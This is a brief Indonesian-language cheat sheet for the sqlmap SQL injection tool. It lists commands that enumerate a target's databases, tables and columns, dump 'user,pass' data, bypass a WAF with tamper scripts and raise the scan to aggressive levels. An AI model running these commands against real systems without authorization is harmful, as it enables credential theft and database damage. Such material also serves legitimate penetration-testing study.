# sqlmap Detail Guide
> Alat otomatisasi eksploitasi SQL Injection paling kuat di dunia.

## Perintah Dasar
```bash
sqlmap -u "http://target.com/page.php?id=1"
```

## Step-by-Step Eksploitasi
1. **Cek Database:**
   `sqlmap -u "URL" --dbs`
2. **Cek Tabel di Database Tertentu:**
   `sqlmap -u "URL" -D nama_db --tables`
3. **Cek Kolom di Tabel Tertentu:**
   `sqlmap -u "URL" -D nama_db -T nama_tabel --columns`
4. **Dump Data:**
   `sqlmap -u "URL" -D nama_db -T nama_tabel -C "user,pass" --dump`

## Tips Lanjutan
- **Gunakan Request File:** Simpan request dari Burp Suite ke file `req.txt`, lalu jalankan `sqlmap -r req.txt`.
- **Bypass WAF:** Gunakan opsi `--tamper=space2comment` atau lainnya.
- **Risk & Level:** Gunakan `--level=5 --risk=3` untuk pencarian yang lebih agresif (Hati-hati, bisa merusak database!).
